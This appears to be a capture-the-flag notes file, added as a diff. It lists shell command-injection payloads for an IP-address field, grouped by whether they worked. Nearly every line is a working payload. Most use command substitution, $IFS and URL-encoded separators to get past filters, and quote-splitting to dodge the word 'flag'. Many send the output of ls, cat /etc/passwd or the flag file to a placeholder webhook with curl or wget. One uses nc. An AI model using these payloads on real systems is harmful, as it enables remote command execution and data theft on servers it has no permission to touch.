@@ -1,0 +1,101 @@
+> DONE
+
+"$(  curl https://webhook_url -d "$(ls /)"  )"
+"$(  curl https://webhook_url -d "$(cat /'f'lag_ZANTntyxFh2oSvVL)"  )"
+
+> good
+
+"$(  curl https://webhook_url -d \"$(ls -mQ /)\"  )"
+
+"$(curl https://webhook_url\"$(find / -maxdepth 1 -type f ! -name 'do')\")"8.8.8.8
+"$(curl https://webhook_url\"$(find / -maxdepth 1 -type f)\")"8.8.8.8
+
+"$(curl https://webhook_url\"$(ls -m /)\")"8.8.8.8
+"$(curl https://webhook_url\"$(ls /)\")"8.8.8.8
+"$(curl https://webhook_url\"$(cat /f'la'g)\")"8.8.8.8
+
+"$(curl https://webhook_url\"$(cat /etc/passwd%7Ctr '\n' ' ')\")"8.8.8.8
+
+> good but fail
+
+"$(curl https://webhook_url\"$(tr '\n' ' ' \"$(ls /)\")\")"8.8.8.8
+
+"$(curl https://webhook_url\"$(tr -cd [:print:],\"$(ls /)\")\")"8.8.8.8
+"$(curl https://webhook_url\"$({tr -cd [:print:],ls /})\")"8.8.8.8
+
+> no wget on remote
+
+"$(wget https://webhook_url\"$(cat /f'la'g)\")"8.8.8.8
+"$(wget https://webhook_url\"$(cat /f'la'g)\")"8.8
+"$(wget http://127.0.0.1:8888/\"$(cat /f'la'g)\")"8.8
+
+> valid
+
+8.8.8.8$IFSls
+
+${ls}8.8.8.8
+`%3B${ls}`8.8.8.8
+
+`%3B${ls}`$IFS8.8.8.8
+
+`%3B$IFS$(ls)${ls}`"${ls}"8.8.8.8
+`"$(ls)"`8.8.8.8
+
+> maybe good
+
+"$(cat /f'l'ag)"8.8
+
+"$(nc 127.0.0.1 8888,cat /f'l'ag)"8.8
+
+> invalid but got result
+
+`%3B$IFS$(ls)${ls}`"$(ls)"8.8.8.8
+"$(ls)"8.8.8.8
+"x=$(ls)"8.8.8.8
+
+> fail
+
+"$(curl https://webhook_url --post-data=\"$(paste -s -d ' ' \\"$(find / -maxdepth 1 -type f)\\")\")"8.8.8.8
+"$(curl https://webhook_url --post-data=\"$(find / -maxdepth 1 -type f -name 'f')\")"8.8.8.8
+
+`$(curl https://webhook_url --post-data=\"$(ls /)\")`8.8.8.8
+
+"$(curl https://webhook_url --post-data=\"`$(ls /)`\")"8.8.8.8
+
+"$(curl https://webhook_url\"$(cat /f'la'g%2A)\")"8.8.8.8
+
+"$(curl https://webhook_url\"$(find / -type f -exec grep -Hi f'la'g {} +)\")"8.8.8.8
+"$(curl https://webhook_url\"$(echo -e \\"$(ls -C /)\\")\")"8.8.8.8
+
+"$(curl https://webhook_urlpaste -z \"$(ls /)\")"8.8.8.8
+"$(curl https://webhook_url\"$(paste -z \"$(ls /)\")\")"8.8.8.8
+"$(curl https://webhook_url\"$(paste -z \\"$(ls /)\\")\")"8.8.8.8
+
+"$(curl https://webhook_url\"$(paste -s -d ' ' \\"$(ls /)\\")\")"8.8.8.8
+"$(curl https://webhook_url\"$(echo \\"$(ls /)\\")\")"8.8.8.8
+
+"$(curl https://webhook_url\"$(cat /f'la'g[A-z0-9\._\/\-=]+)\")"8.8.8.8
+
+"$(curl https://webhook_url\"$(ls / %0A tr '\n' ' ')\")"8.8.8.8
+
+
+"$(curl https://webhook_url\"$(cat /f'la'g[0-z])\")"8.8.8.8
+"$(curl https://webhook_url\"$(cat /[f'la'g])\")"8.8.8.8
+
+"$(curl https://webhook_url\"$(cat /^f'la'g)\")"8.8.8.8
+"$(curl https://webhook_url\"$(cat /^f'la'g[0-z])\")"8.8.8.8
+
+"$(curl https://webhook_url\"$(grep f'la'g, ls /)\")"8.8.8.8
+
+"$(curl https://webhook_url\"$(sed -z 'y/\n/ /' \\"$(ls /)\\")\")"8.8.8.8
+
+"$(curl https://webhook_url\"$(sed -z 's/\n/ /g' $(ls /))\")"8.8.8.8
+"$(curl https://webhook_url\"$(sed 's/\n//' $(ls /))\")"8.8.8.8
+
+"$(curl https://webhook_url\"$(sed -e ':a' -e 'N' -e '$!ba' -e 's/\n/ /g' \"$(ls /)\")\")"8.8.8.8
+
+"$(curl https://webhook_url\"$(sed ':a;N;$!ba;s/\n/ /g' \"$(ls /)\")\")"8.8.8.8
+
+"$(cat /f'l'ag)"
+"$(ls$IFS/)"8.8.8.8
+"$(cat$IFS./index.php)"8.8.8.8
